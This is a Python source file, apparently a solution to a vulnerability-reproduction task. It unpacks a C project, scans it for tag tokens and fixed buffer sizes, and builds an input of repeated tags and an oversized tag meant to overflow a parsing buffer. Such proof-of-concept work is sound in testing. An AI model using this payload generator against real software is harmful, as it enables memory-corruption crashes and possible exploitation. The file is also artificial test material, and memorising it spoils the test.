import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple


def _is_within_directory(directory: str, target: str) -> bool:
    directory = os.path.abspath(directory)
    target = os.path.abspath(target)
    try:
        common = os.path.commonpath([directory, target])
    except Exception:
        return False
    return common == directory


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        name = member.name
        if not name:
            continue
        member_path = os.path.join(path, name)
        if not _is_within_directory(path, member_path):
            continue
        if member.islnk() or member.issym():
            continue
        try:
            tar.extract(member, path=path, set_attrs=False)
        except Exception:
            continue


class Solution:
    _TAG_TOKEN_RE = re.compile(r'<[/A-Za-z][A-Za-z0-9:_-]{0,30}>')
    _BRACKET_TOKEN_RE = re.compile(r'\[[A-Za-z0-9:_-]{1,32}\]')
    _BRACE_TOKEN_RE = re.compile(r'\{[A-Za-z0-9:_-]{1,32}\}')
    _PERCENT_TOKEN_RE = re.compile(r'%[A-Za-z0-9:_-]{1,32}%')
    _AT_TOKEN_RE = re.compile(r'@[A-Za-z0-9:_-]{1,32}@')
    _DOLLAR_TOKEN_RE = re.compile(r'\$[A-Za-z0-9:_-]{1,32}\$')

    _CMP_TAGNAME_RE = re.compile(
        r'\b(?:str(?:n)?cmp|str(?:n)?casecmp)\s*\(\s*[^,]+,\s*"([^"]{1,64})"\s*(?:,\s*\d+\s*)?\)',
        re.MULTILINE,
    )
    _CHAR_BUF_RE = re.compile(r'\bchar\s+\w+\s*\[\s*(\d{2,6})\s*\]')
    _DEFINE_NUM_RE = re.compile(r'^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]{0,127})\s+(\d{2,6})\b', re.MULTILINE)

    _TEXT_EXTS = {
        ".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh",
        ".l", ".y", ".m", ".mm",
        ".txt", ".md", ".rst",
        ".in", ".inc",
    }

    def _scan_sources(self, root: str) -> Tuple[Dict[str, int], List[int], List[int]]:
        token_counts: Dict[str, int] = {}
        buf_sizes_tag: List[int] = []
        buf_sizes_all: List[int] = []

        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "build", "out", "__pycache__")]
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext not in self._TEXT_EXTS:
                    continue
                fpath = os.path.join(dirpath, fn)
                try:
                    st = os.stat(fpath)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                try:
                    with open(fpath, "rb") as f:
                        data = f.read()
                except Exception:
                    continue

                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue

                lower = text.lower()
                has_tag_word = "tag" in lower

                for m in self._CHAR_BUF_RE.finditer(text):
                    try:
                        n = int(m.group(1))
                    except Exception:
                        continue
                    if 64 <= n <= 65536:
                        buf_sizes_all.append(n)
                        if has_tag_word:
                            buf_sizes_tag.append(n)

                for m in self._DEFINE_NUM_RE.finditer(text):
                    name = m.group(1)
                    try:
                        n = int(m.group(2))
                    except Exception:
                        continue
                    if not (64 <= n <= 65536):
                        continue
                    buf_sizes_all.append(n)
                    if has_tag_word or any(k in name.upper() for k in ("OUT", "BUF", "LINE", "TEXT", "TAG")):
                        buf_sizes_tag.append(n)

                def _add_token(tok: str, inc: int = 1) -> None:
                    if not tok:
                        return
                    if len(tok) < 3 or len(tok) > 128:
                        return
                    tok = tok.strip()
                    if not tok:
                        return
                    token_counts[tok] = token_counts.get(tok, 0) + inc

                for tok in self._TAG_TOKEN_RE.findall(text):
                    _add_token(tok)
                for tok in self._BRACKET_TOKEN_RE.findall(text):
                    _add_token(tok)
                for tok in self._BRACE_TOKEN_RE.findall(text):
                    _add_token(tok)
                for tok in self._PERCENT_TOKEN_RE.findall(text):
                    _add_token(tok)
                for tok in self._AT_TOKEN_RE.findall(text):
                    _add_token(tok)
                for tok in self._DOLLAR_TOKEN_RE.findall(text):
                    _add_token(tok)

                for m in self._CMP_TAGNAME_RE.finditer(text):
                    name = m.group(1).strip()
                    if not name:
                        continue
                    if any(c in name for c in "\r\n\t "):
                        continue
                    if len(name) > 64:
                        continue
                    if name.startswith("<") and name.endswith(">") and len(name) >= 3:
                        _add_token(name, inc=3)
                    else:
                        if re.fullmatch(r"[A-Za-z0-9:_-]{1,32}", name):
                            _add_token(f"<{name}>", inc=3)
                            _add_token(f"</{name}>", inc=1)
                        else:
                            _add_token(name, inc=1)

        return token_counts, buf_sizes_tag, buf_sizes_all

    def _choose_token(self, token_counts: Dict[str, int]) -> str:
        defaults = ["<a>", "<b>", "<i>", "<p>", "<br>", "</a>", "</b>", "</i>", "</p>"]
        for d in defaults:
            token_counts.setdefault(d, 1)

        best_tok = "<a>"
        best_score = -1.0
        for tok, cnt in token_counts.items():
            if not tok:
                continue
            if len(tok) < 3 or len(tok) > 128:
                continue
            if tok.startswith("<") and tok.endswith(">"):
                if not re.fullmatch(r"</?[A-Za-z][A-Za-z0-9:_-]{0,30}>", tok):
                    continue
                form_bonus = 2.0
            else:
                form_bonus = 1.0

            score = (cnt * form_bonus) / max(1, len(tok))
            if score > best_score:
                best_score = score
                best_tok = tok
            elif score == best_score and len(tok) < len(best_tok):
                best_tok = tok

        return best_tok

    def _choose_buf_size(self, buf_sizes_tag: List[int], buf_sizes_all: List[int]) -> int:
        candidates = buf_sizes_tag if buf_sizes_tag else buf_sizes_all
        filtered = [n for n in candidates if 256 <= n <= 16384]
        if not filtered:
            filtered = [n for n in candidates if 128 <= n <= 65536]
        if not filtered:
            return 1024
        filtered.sort()
        return filtered[0]

    def _build_payload(self, token: str, buf_size: int) -> bytes:
        token_b = token.encode("utf-8", errors="ignore")
        if not token_b:
            token_b = b"<a>"

        target_len = buf_size + 256
        if target_len < 1500:
            target_len = 1500
        if target_len > 8000:
            target_len = 8000

        n = max(1, target_len // max(1, len(token_b)))
        seg1 = token_b * n

        long_inner_len = buf_size + 512
        if long_inner_len < 1024:
            long_inner_len = 1024
        if long_inner_len > 7000:
            long_inner_len = 7000

        seg2 = b"<" + (b"A" * long_inner_len) + b">"
        seg3 = (b"<br>" * 400)[:1200]
        payload = seg1 + b"\n" + seg3 + b"\n" + seg2 + b"\n"

        if len(payload) > 12000:
            payload = payload[:12000] + b"\n"
        return payload

    def solve(self, src_path: str) -> bytes:
        root = src_path
        tmp: Optional[tempfile.TemporaryDirectory] = None

        if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
            tmp = tempfile.TemporaryDirectory()
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    _safe_extract_tar(tf, tmp.name)
                root = tmp.name
            except Exception:
                root = src_path

        try:
            token_counts, buf_sizes_tag, buf_sizes_all = self._scan_sources(root)
            token = self._choose_token(token_counts)
            buf_size = self._choose_buf_size(buf_sizes_tag, buf_sizes_all)
            return self._build_payload(token, buf_size)
        finally:
            if tmp is not None:
                try:
                    tmp.cleanup()
                except Exception:
                    pass